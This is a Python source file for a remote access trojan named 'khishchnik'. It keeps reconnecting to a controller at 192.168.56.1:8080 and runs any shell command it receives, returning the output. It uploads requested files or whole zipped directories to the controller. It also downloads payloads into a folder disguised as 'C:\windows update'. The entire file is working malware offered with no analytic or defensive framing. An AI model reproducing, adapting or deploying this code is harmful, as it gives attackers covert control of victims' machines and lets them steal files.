import subprocess
import socket
import threading 
import time
import os
import shutil

class khishchnik:
    def __init__(self):
        self.ip='192.168.56.1'
        self.port=8080
        self.socket=socket.socket()
        self.connection=False
        self.jack= True
        self.ll=None
        self.message=''
        threading.Thread(target=self.connectivity).start()
        threading.Thread(target=self.accept_command).start()
        threading.Thread(target=self.pinging).start()

    def connectivity(self):
        while True:
            if not self.connection:
                try:
                    self.socket=socket.socket()
                    self.socket.connect((self.ip,self.port))
                    self.connection=True
                except  Exception as e:
                    pass
            time.sleep(0.6)

    def accept_command(self):
        while True:
            try:
                if self.connection:
                    self.r=self.socket.recv(1024).decode()
                    if 'kokurokuu' not in self.r:
                        if self.r=='stop':
                            self.jack=False
                            while True:
                                message=self.socket.recv(1024).decode()
    
                                if len(message)>0:
                                    if message=='q':
                                        self.jack=True
                                        break
                                    else:
                                        if message=='ls':
                                            files=os.listdir()
                                            self.socket.send(str(f'sending command for ls {len(str(files))}').encode())
                                            time.sleep(0.67)
                                            self.socket.send(str(files).encode())
                                        elif message.startswith('move'):
                                            x=message.split(' ')
                                            y,z=x[1],x[-1]
                                            z+='\\'
                                            z+=y
                                            try:
                                                os.replace(y,z)
                                                message='1 file(s) move sucessfully'
                                                self.socket.send(str(len(message)).encode())
                                                time.sleep(0.67)
                                                self.socket.send(message.encode())
                                            except Exception as e:
                                                l=message.split(' ')
                                                message=f'ERROR : file not found in path({l[1]})'
                                                self.socket.send(str(len(message)).encode())
                                                time.sleep(0.67)
                                                self.socket.send(message.encode())


                                        elif message.startswith('cd') and len(message)>3:
                                            t=message.split(' ')[1:]
                                            t=' '.join(t)
                                            try:
                                                os.chdir(t)
                                                m=f'path changed {message}'
                                                self.socket.send(str(len(m)).encode())
                                                time.sleep(0.67)
                                                self.socket.send(m.encode())
                                            except Exception as e:
                                                message=f'ERROR  directory ({t}) not found !'
                                                self.socket.send(str(len(message)).encode())
                                                time.sleep(0.67)
                                                self.socket.send(message.encode())


                                        elif message=='send_me__??':
                                            try:
                                                self.socket.send('sending_byte?'.encode()) 
                                                dd=''
                                                while dd !='oblagogo':
                                                    dd=self.socket.recv(1024).decode()
                                                    if dd !='oblagogo':
                                                        result=dd
                                                        result=''.join(result.split('\r\n'))
                                                        time.sleep(0.8)
                                                        if os.path.exists(result):
                                                            if os.path.isfile(result):
                                                                self.socket.send('sending__byte__file??'.encode())
                                                                time.sleep(0.5)
                                                                size=os.path.getsize(result)
                                                                self.socket.send(str(size).encode())
                                                                time.sleep(0.6)
                                                                with open(result.strip(),'rb') as file:
                                                                    self.socket.sendfile(file)
                                                            else:
                                                                try:
                                                                    original_path=os.getcwd()
                                                                    self.socket.send('sending?directory?__'.encode())
                                                                    time.sleep(0.6)
                                                                    size=0
                                                                    path=os.path.join(os.path.expanduser('~'),'Document','tempary.zip')
                                                                    new_name=shutil.make_archive(path,'zip',result)
                                                                    get_size=os.path.getsize(new_name)
                                                                    self.socket.send(str(get_size).encode())
                                                                    time.sleep(0.5)
                                                                    with open(new_name,'rb') as ehh:
                                                                        self.socket.sendfile(ehh)
                                                                    kk=''
                                                                    while dd!='oboxxx':
                                                                        dd=self.socket.recv(1024).decode()
                                                                    shutil.rmtree(os.path.expanduser('~'),'Document','tempary')
                                                                    

                                                                except Exception as e:
                                                                    pass
                                                                
                                                        else:
                                                            
                                                            message=f'ERROR :{result} FILE DOES NOT EXIST'
                                                            self.socket.send(str(len(message)).encode())
                                                            time.sleep(0.8)
                                                            self.socket.send(message.encode())
                                                    
                                            except Exception as e:
                                                pass


                                        elif message=='recievee__?':
                                            try:
                                                path='C:\\windows update'
                                                if os.path.isdir(path):
                                                    pass
                                                else:
                                                    os.mkdir(path)
                                                k=self.socket.recv(1024).decode()
                                                q=self.socket.recv(1024).decode()
                                                path+='\\'
                                                path+=q
                                                counter=0
                                                
                                                with open(path,'wb') as file:
                                                    while counter<int(k):
                                                        files_=self.socket.recv(1024)
                                                        file.write(files_)
                                                        counter+=len(files_)
                                                self.socket.send('donezoo'.encode())
                                            except Exception as e:
                                                pass
                                            
                                        else:
                                            try:
                                                x=subprocess.run(message,stdout=subprocess.PIPE,shell=True)
                                                if x.returncode==0:
                                                    message=x.stdout
                                                    self.socket.send(str(len(message)).encode())
                                                    time.sleep(0.67)
                                                    self.socket.send(message)
                                                else:
                                                    x=subprocess.run([message],stdout=subprocess.PIPE,shell=True)
                                                    if x.returncode==0:
                                                        message=x.stdout
                                                        self.socket.send(str(len(message)).encode())
                                                        time.sleep(0.67)
                                                        self.socket.send(message)
                                                    else:
                                                        message=f'ERROR : command cannot be executed'
                                                        self.socket.send(str(len(message)).encode())
                                                        time.sleep(0.67)
                                                        self.socket.send(message.encode())
                                            except Exception as e:
                                                message=f'ERROR : command cannot be executed'
                                                self.socket.send(str(len(message)).encode())
                                                time.sleep(0.67)
                                                self.socket.send(message.encode())
                                                
            except Exception as e:
                pass

    def pinging(self):
        while True:
            if self.connection and self.jack :
                try:
                    self.socket.send("pinging_400qw".encode())
                except Exception as e:
                    self.socket.close()
                    self.connection=False
            time.sleep(0.7)
    

if __name__=='__main__':
    khishchnik()



